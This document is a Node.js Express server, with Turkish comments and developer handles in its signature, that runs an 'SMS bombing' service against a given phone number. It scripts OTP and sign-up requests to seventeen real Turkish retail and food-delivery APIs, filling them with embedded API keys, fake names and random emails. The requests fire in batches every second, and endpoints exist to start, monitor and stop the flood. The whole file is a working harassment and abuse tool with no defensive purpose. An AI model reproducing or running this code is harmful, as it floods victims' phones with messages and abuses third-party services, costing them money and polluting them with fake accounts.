"use strict";

const express = require("express");
const axios = require("axios");
const { v4: uuidv4 } = require("uuid");

const app = express();
app.use(express.json());

// Global jobs nesnesi: token -> job bilgisi
const jobs = {};

// İmza bilgileri
const signature = {
  gelistirici: "@batupy",
  kanal: "@batuheck"
};

// Yardımcı Fonksiyon: Rastgele e-posta oluşturucu
function thomasMail() {
  const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
  let mailPrefix = "";
  for (let i = 0; i < 8; i++) {
    mailPrefix += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return mailPrefix + "@hotmail.com";
}

// ------------------------
// API Fonksiyonları

async function file(number) {
  try {
    const response = await axios.post(
      "https://api.filemarket.com.tr/v1/otp/send",
      { mobilePhoneNumber: `90${number}` },
      { timeout: 5000 }
    );
    const success = response.data.data === "200 OK";
    return { success, source: "filemarket.com.tr" };
  } catch (err) {
    return { success: false, source: "filemarket.com.tr" };
  }
}

async function kimgbister(number) {
  try {
    const url = "https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp";
    const payload = { msisdn: `90${number}` };
    const response = await axios.post(url, payload, { timeout: 5000 });
    const success = response.status === 200;
    return { success, source: "kimgbiister" };
  } catch (err) {
    return { success: false, source: "kimgbiister" };
  }
}

async function tiklagelsin(number) {
  try {
    const url = "https://www.tiklagelsin.com/user/graphql";
    const payload = {
      operationName: "GENERATE_OTP",
      variables: {
        phone: `+90${number}`,
        challenge: uuidv4(),
        deviceUniqueId: `web_${uuidv4()}`
      },
      query: "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) { generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId) }"
    };
    const response = await axios.post(url, payload, { timeout: 5000 });
    const success = response.status === 200;
    return { success, source: "tiklagelsin.com" };
  } catch (err) {
    return { success: false, source: "tiklagelsin.com" };
  }
}

async function bim(number) {
  try {
    const url = "https://bim.veesk.net:443/service/v1.0/account/login";
    const response = await axios.post(url, { phone: number }, { timeout: 6000 });
    const success = response.status === 200;
    return { success, source: "bim.veesk.net" };
  } catch (err) {
    return { success: false, source: "bim.veesk.net" };
  }
}

async function bodrum(number) {
  try {
    const url = "https://gandalf.orwi.app:443/api/user/requestOtp";
    const headers = {
      "Content-Type": "application/json",
      Accept: "application/json",
      "Accept-Encoding": "gzip, deflate, br",
      "Accept-Language": "en-GB,en;q=0.9",
      Token: "",
      Apikey: "Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE",
      Origin: "capacitor://localhost",
      Region: "EN",
      "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
      Connection: "keep-alive"
    };
    const payload = { gsm: `+90${number}`, source: "orwi" };
    const response = await axios.post(url, payload, { headers, timeout: 6000 });
    const success = response.status === 200;
    return { success, source: "gandalf.orwi.app" };
  } catch (err) {
    return { success: false, source: "gandalf.orwi.app" };
  }
}

async function dominos(number, mail) {
  try {
    const url = "https://frontend.dominos.com.tr:443/api/customer/sendOtpCode";
    const headers = {
      "Content-Type": "application/json;charset=utf-8",
      Accept: "application/json, text/plain, */*",
      Authorization: "Bearer eyJh... (token kısmı sabit)",
      "Device-Info": "Unique-Info: ...",
      Appversion: "IOS-7.1.0",
      "Accept-Encoding": "gzip, deflate, br",
      "Accept-Language": "tr-TR,tr;q=0.9",
      "User-Agent": "Dominos/7.1.0 CFNetwork/1335.0.3.4 Darwin/21.6.0",
      Servicetype: "CarryOut",
      Locationcode: "undefined"
    };
    const json_data = { email: mail, isSure: false, mobilePhone: number };
    const response = await axios.post(url, json_data, { headers, timeout: 6000 });
    const success = response.data && response.data.isSuccess === true;
    return { success, source: "frontend.dominos.com.tr" };
  } catch (err) {
    return { success: false, source: "frontend.dominos.com.tr" };
  }
}

async function uysal(number) {
  try {
    const url = "https://api.uysalmarket.com.tr:443/api/mobile-users/send-register-sms";
    const headers = {
      "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
      Accept: "application/json, text/plain, */*",
      "Accept-Encoding": "gzip, deflate, br",
      "Content-Type": "application/json;charset=utf-8",
      Origin: "https://www.uysalmarket.com.tr",
      Dnt: "1",
      "Sec-Gpc": "1",
      Referer: "https://www.uysalmarket.com.tr/",
      "Sec-Fetch-Dest": "empty",
      "Sec-Fetch-Mode": "cors",
      "Sec-Fetch-Site": "same-site",
      Priority: "u=0",
      Te: "trailers"
    };
    const json_data = { phone_number: number };
    const response = await axios.post(url, json_data, { headers, timeout: 6000 });
    const success = response.status === 200;
    return { success, source: "api.uysalmarket.com.tr" };
  } catch (err) {
    return { success: false, source: "api.uysalmarket.com.tr" };
  }
}

async function kofteciyusuf(number) {
  try {
    const url = "https://gateway.poskofteciyusuf.com:1283/auth/auth/smskodugonder";
    const headers = {
      "Content-Type": "application/json; charset=utf-8",
      Anonymousclientid: "",
      Accept: "application/json",
      Ostype: "iOS",
      Appversion: "4.0.4.0",
      "Accept-Language": "en-GB,en;q=0.9",
      Firmaid: "82",
      "X-Guatamala-Kirsallari": "@@b7c5EAAAACwZI8p8fLJ8p6nOq9kTLL+0GQ1wCB4VzTQSq0sekKeEdAoQGZZo+7fQw+IYp38V0I/4JUhQQvrq1NPw4mHZm68xgkb/rmJ3y67lFK/uc+uq",
      "Accept-Encoding": "gzip, deflate, br",
      Language: "tr-TR",
      "User-Agent": "YemekPosMobil/53 CFNetwork/1335.0.3.4 Darwin/21.6.0"
    };
    const json_data = {
      FireBaseCihazKey: null,
      FirmaId: 82,
      GuvenlikKodu: null,
      Telefon: `90${number}`
    };
    const response = await axios.post(url, json_data, { headers, timeout: 6000 });
    const success = response.data && response.data.Success === true;
    return { success, source: "poskofteciyusuf.com" };
  } catch (err) {
    return { success: false, source: "poskofteciyusuf.com" };
  }
}

async function komagene(number) {
  try {
    const url = "https://gateway.komagene.com.tr:443/auth/auth/smskodugonder";
    const json_data = { FirmaId: 32, Telefon: `90${number}` };
    const headers = {
      "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
      Accept: "*/*",
      "Accept-Encoding": "gzip, deflate, br",
      Referer: "https://www.komagene.com.tr/",
      Anonymousclientid: "0dbf392b-ab10-48b3-5cda-31f3c19816e6",
      Firmaid: "32",
      "X-Guatamala-Kirsallari": "@@b7c5EAAAACwZI8p8fLJ8p6nOq9kTLL+0GQ1wCB4VzTQSq0sekKeEdAoQGZZo+7fQw+IYp38V0I/4JUhQQvrq1NPw4mHZm68xgkb/rmJ3y67lFK/uc+uq",
      "Content-Type": "application/json",
      Origin: "https://www.komagene.com.tr",
      Dnt: "1",
      "Sec-Gpc": "1",
      "Sec-Fetch-Dest": "empty",
      "Sec-Fetch-Mode": "cors",
      "Sec-Fetch-Site": "same-site",
      Priority: "u=0",
      Te: "trailers",
      Connection: "keep-alive"
    };
    const response = await axios.post(url, json_data, { headers, timeout: 6000 });
    const success = response.data && response.data.Success === true;
    return { success, source: "komagene.com" };
  } catch (err) {
    return { success: false, source: "komagene.com" };
  }
}

async function yapp(number, mail) {
  try {
    const url = "https://yapp.com.tr:443/api/mobile/v1/register";
    const headers = {
      Accept: "application/json",
      "Content-Type": "application/json",
      "X-Content-Language": "en",
      "Accept-Language": "en-BA;q=1, tr-BA;q=0.9, bs-BA;q=0.8",
      Authorization: "Bearer ",
      "User-Agent": "YappApp/1.1.5 (iPhone; iOS 15.8.3; Scale/3.00)",
      "Accept-Encoding": "gzip, deflate, br"
    };
    const payload = {
      app_version: "1.1.5",
      code: "tr",
      device_model: "iPhone8,5",
      device_name: "thomas",
      device_type: "I",
      device_version: "15.8.3",
      email: mail,
      firstname: "shelby",
      is_allow_to_communication: "1",
      language_id: "2",
      lastname: "yilmaz",
      phone_number: number,
      sms_code: ""
    };
    const response = await axios.post(url, payload, { headers, timeout: 6000 });
    const success = response.status === 200;
    return { success, source: "yapp.com.tr" };
  } catch (err) {
    return { success: false, source: "yapp.com.tr" };
  }
}

async function evidea(number, mail) {
  try {
    const url = "https://www.evidea.com:443/users/register/";
    const headers = {
      "Content-Type": "multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi",
      "X-Project-Name": "undefined",
      Accept: "application/json, text/plain, */*",
      "X-App-Type": "akinon-mobile",
      "X-Requested-With": "XMLHttpRequest",
      "Accept-Language": "tr-TR,tr;q=0.9",
      "Cache-Control": "no-store",
      "Accept-Encoding": "gzip, deflate",
      "X-App-Device": "ios",
      Referer: "https://www.evidea.com/",
      "User-Agent": "Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0",
      "X-Csrftoken": "7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps"
    };
    const boundary = "fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi";
    const data =
      `--${boundary}\r\n` +
      `content-disposition: form-data; name="first_name"\r\n\r\nthomas\r\n` +
      `--${boundary}\r\n` +
      `content-disposition: form-data; name="last_name"\r\n\r\ncan\r\n` +
      `--${boundary}\r\n` +
      `content-disposition: form-data; name="email"\r\n\r\n${mail}\r\n` +
      `--${boundary}\r\n` +
      `content-disposition: form-data; name="email_allowed"\r\n\r\nfalse\r\n` +
      `--${boundary}\r\n` +
      `content-disposition: form-data; name="sms_allowed"\r\n\r\ntrue\r\n` +
      `--${boundary}\r\n` +
      `content-disposition: form-data; name="password"\r\n\r\n31ABC..abc31\r\n` +
      `--${boundary}\r\n` +
      `content-disposition: form-data; name="phone"\r\n\r\n0${number}\r\n` +
      `--${boundary}\r\n` +
      `content-disposition: form-data; name="confirm"\r\n\r\ntrue\r\n` +
      `--${boundary}--\r\n`;
    const response = await axios.post(url, data, { headers, timeout: 6000 });
    const success = response.status === 202;
    return { success, source: "evidea.com" };
  } catch (err) {
    return { success: false, source: "evidea.com" };
  }
}

async function ucdortbes(number) {
  try {
    const url = "https://api.345dijital.com:443/api/users/register";
    const headers = {
      Accept: "application/json, text/plain, */*",
      "Content-Type": "application/json",
      "Accept-Encoding": "gzip, deflate",
      "User-Agent": "AriPlusMobile/21 CFNetwork/1335.0.3.2 Darwin/21.6.0",
      "Accept-Language": "en-US,en;q=0.9",
      Authorization: "null",
      Connection: "close"
    };
    const json_data = {
      email: "",
      name: "thomas",
      phoneNumber: `+90${number}`,
      surname: "Bas"
    };
    const response = await axios.post(url, json_data, { headers, timeout: 6000 });
    if (response.data && response.data.error === "E-Posta veya telefon zaten kayıtlı!") {
      return { success: false, source: "api.345dijital.com" };
    } else {
      return { success: true, source: "api.345dijital.com" };
    }
  } catch (err) {
    return { success: true, source: "api.345dijital.com" };
  }
}

async function suiste(number) {
  try {
    const url = "https://suiste.com:443/api/auth/code";
    const headers = {
      "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
      "X-Mobillium-Device-Brand": "Apple",
      Accept: "application/json",
      "X-Mobillium-Os-Type": "iOS",
      "X-Mobillium-Device-Model": "iPhone",
      "Mobillium-Device-Id": "2390ED28-075E-465A-96DA-DFE8F84EB330",
      "Accept-Language": "en",
      "Accept-Encoding": "gzip, deflate, br",
      "X-Mobillium-App-Build-Number": "1469",
      "User-Agent": "suiste/1.7.11 (com.mobillium.suiste; build:1469; iOS 15.8.3) Alamofire/5.9.1",
      "X-Mobillium-Os-Version": "15.8.3",
      "X-Mobillium-App-Version": "1.7.11"
    };
    const data = new URLSearchParams({
      action: "register",
      device_id: "2390ED28-075E-465A-96DA-DFE8F84EB330",
      full_name: "thomas yilmaz",
      gsm: number,
      is_advertisement: "1",
      is_contract: "1",
      password: "thomas31"
    });
    const response = await axios.post(url, data, { headers, timeout: 6000 });
    const success = response.data && response.data.code === "common.success";
    return { success, source: "suiste.com" };
  } catch (err) {
    return { success: false, source: "suiste.com" };
  }
}

async function porty(number) {
  try {
    const url = "https://panel.porty.tech:443/api.php?";
    const headers = {
      Accept: "*/*",
      "Content-Type": "application/json; charset=UTF-8",
      "Accept-Encoding": "gzip, deflate",
      "Accept-Language": "en-US,en;q=0.9",
      "User-Agent": "Porty/1 CFNetwork/1335.0.3.4 Darwin/21.6.0",
      Token: "q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ"
    };
    const json_data = { job: "start_login", phone: number };
    const response = await axios.post(url, json_data, { headers, timeout: 6000 });
    const success = response.data && response.data.status === "success";
    return { success, source: "panel.porty.tech" };
  } catch (err) {
    return { success: false, source: "panel.porty.tech" };
  }
}

async function orwi(number) {
  try {
    const url = "https://gandalf.orwi.app:443/api/user/requestOtp";
    const headers = {
      "Content-Type": "application/json",
      Accept: "application/json",
      "Accept-Encoding": "gzip, deflate, br",
      "Accept-Language": "en-GB,en;q=0.9",
      Token: "",
      Apikey: "YWxpLTEyMzQ1MTEyNDU2NTQzMg",
      Origin: "capacitor://localhost",
      Region: "EN",
      "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
      Connection: "keep-alive"
    };
    const json_data = { gsm: `+90${number}`, source: "orwi" };
    const response = await axios.post(url, json_data, { headers, timeout: 6000 });
    const success = response.status === 200;
    return { success, source: "gandalf.orwi.app" };
  } catch (err) {
    return { success: false, source: "gandalf.orwi.app" };
  }
}

async function naosstars(number) {
  try {
    const url = "https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350";
    const headers = {
      Uniqid: "9c9fa861-cc5d-43c0-b4ea-1b541be15351",
      "User-Agent": "naosstars/1.0030 CFNetwork/1335.0.3.2 Darwin/21.6.0",
      "Access-Control-Allow-Origin": "*",
      Locale: "en-TR",
      Version: "1.0030",
      Os: "ios",
      Apiurl: "https://api.naosstars.com/api/",
      "Device-Id": "D41CE5F3-53BB-42CF-8611-B4FE7529C9BC",
      Platform: "ios",
      "Accept-Language": "en-US,en;q=0.9",
      Timezone: "Europe/Istanbul",
      Globaluuidv4: "d57bd5d2-cf1e-420c-b43d-61117cf9b517",
      Timezoneoffset: "-180",
      Accept: "application/json",
      "Content-Type": "application/json; charset=utf-8",
      "Accept-Encoding": "gzip, deflate",
      Apitype: "mobile_app"
    };
    const json_data = { telephone: `+90${number}`, type: "register" };
    const response = await axios.post(url, json_data, { headers, timeout: 6000 });
    const success = response.status === 200;
    return { success, source: "api.naosstars.com" };
  } catch (err) {
    return { success: false, source: "api.naosstars.com" };
  }
}

async function metro(number) {
  try {
    const url = "https://mobile.metro-tr.com:443/api/mobileAuth/validateSmsSend";
    const headers = {
      Accept: "*/*",
      "Content-Type": "application/json; charset=utf-8",
      "Accept-Encoding": "gzip, deflate, br",
      Applicationversion: "2.4.1",
      Applicationplatform: "2",
      "User-Agent": "Metro Turkiye/2.4.1 (com.mcctr.mobileapplication; build:4; iOS 15.8.3) Alamofire/4.9.1",
      "Accept-Language": "en-BA;q=1.0, tr-BA;q=0.9, bs-BA;q=0.8",
      Connection: "keep-alive"
    };
    const json_data = { methodType: "2", mobilePhoneNumber: number };
    const response = await axios.post(url, json_data, { headers, timeout: 6000 });
    const success = response.data && response.data.status === "success";
    return { success, source: "mobile.metro-tr.com" };
  } catch (err) {
    return { success: false, source: "mobile.metro-tr.com" };
  }
}

// ------------------------
// API Fonksiyonlarını içeren liste
const apiFunctions = [
  file,
  kimgbister,
  tiklagelsin,
  bim,
  bodrum,
  dominos,
  komagene,
  evidea,
  kofteciyusuf,
  yapp,
  uysal,
  ucdortbes,
  suiste,
  porty,
  orwi,
  naosstars,
  metro
];

// ------------------------
// SMS Bombing Job Runner

// runJob() fonksiyonu, job.stopped false olduğu sürece kendini 1 saniyede bir çağırır.
// Eğer job.paused durumdaysa 1 saniye bekleyip tekrar deneyecektir.
async function runJob(job) {
  if (job.stopped) return;
  if (job.paused) {
    setTimeout(() => runJob(job), 1000);
    return;
  }
  await executeBombIteration(job);
  setTimeout(() => runJob(job), 1000);
}

// Her iterasyonda 100x apiFunctions çağrısını batch halinde çalıştırır.
async function executeBombIteration(job) {
  const tasks = [];
  for (let i = 0; i < 100; i++) {
    for (const fn of apiFunctions) {
      if ([dominos, evidea, yapp].includes(fn)) {
        tasks.push(fn(job.phone, thomasMail()));
      } else {
        tasks.push(fn(job.phone));
      }
    }
  }
  const batchSize = 50;
  for (let i = 0; i < tasks.length; i += batchSize) {
    const batch = tasks.slice(i, i + batchSize);
    const results = await Promise.allSettled(batch);
    results.forEach(result => {
      const res = result.value;
      if (res && res.success) {
        job.successCount++;
        console.log(`Başarılı ✅ [ ${job.phone} ] --> ${res.source}`);
      } else {
        job.failureCount++;
        console.log(`Başarısız ❌ [ ${job.phone} ] --> ${res ? res.source : "unknown"}`);
      }
    });
    await new Promise(resolve => setImmediate(resolve));
  }
}

// ------------------------
// Express Endpoint'leri

// 1. /sms=:number endpoint: Aynı IP adresi için aynı telefon numarasıyla yalnızca bir aktif token oluşturulabilir.
app.get("/sms=:number", (req, res) => {
  const number = req.params.number.trim();
  if (!/^\d{10}$/.test(number)) {
    return res.status(400).json({ 
      error: "Lütfen geçerli 10 haneli telefon numarası giriniz.", 
      ...signature 
    });
  }
  const ip = req.ip;
  for (let key in jobs) {
    const job = jobs[key];
    if (job.ip === ip && job.phone === number && !job.stopped) {
      return res.status(400).json({ 
        error: "Bu IP adresi için bu telefon numarası ile zaten aktif bir token oluşturulmuş.", 
        ...signature 
      });
    }
  }
  const token = uuidv4();
  const job = {
    token,
    phone: number,
    ip,
    successCount: 0,
    failureCount: 0,
    paused: false,
    stopped: false
  };
  jobs[token] = job;
  runJob(job);
  res.json({ 
    message: "SMS bombing başladı.", 
    token, 
    ...signature 
  });
});

// 2. /durum/token=:token endpoint’i: Job'u 5 saniye geçici duraklatıp durum bilgisini döndürür.
// Eğer job kalıcı olarak durdurulmamışsa işleyici yeniden başlatılır.
app.get("/durum/token=:token", async (req, res) => {
  const token = req.params.token.trim();
  const job = jobs[token];
  if (!job) return res.status(404).json({ error: "Job bulunamadı.", ...signature });
  
  job.paused = true;
  await new Promise(resolve => setTimeout(resolve, 5000));
  if (!job.stopped) {
    job.paused = false;
    runJob(job);
  }
  res.json({
    phone: job.phone,
    running: !job.paused && !job.stopped,
    successCount: job.successCount,
    failureCount: job.failureCount,
    ...signature
  });
});

// 3. /dur/token=:token endpoint’i: Job'u 5 saniye geçici duraklatır, ardından kalıcı olarak durdurur.
app.get("/dur/token=:token", async (req, res) => {
  const token = req.params.token.trim();
  const job = jobs[token];
  if (!job) return res.status(404).json({ error: "Job bulunamadı.", ...signature });
  if (job.stopped) return res.json({ message: "Job zaten durdurulmuş.", ...signature });
  
  job.paused = true;
  await new Promise(resolve => setTimeout(resolve, 5000));
  job.stopped = true;
  res.json({
    message: `SMS bombing ${job.phone} için kalıcı olarak durduruldu.`,
    successCount: job.successCount,
    failureCount: job.failureCount,
    ...signature
  });
});

// 4. /api/ben endpoint’i: İstek yapan IP adresine ait tüm job bilgilerini döndürür.
app.get("/api/ben", (req, res) => {
  const ip = req.ip;
  const ipJobs = [];
  for (let token in jobs) {
    if (jobs[token].ip === ip) {
      ipJobs.push(jobs[token]);
    }
  }
  res.json({ jobs: ipJobs, ...signature });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Sunucu http://localhost:${PORT} adresinde çalışıyor...`);
});
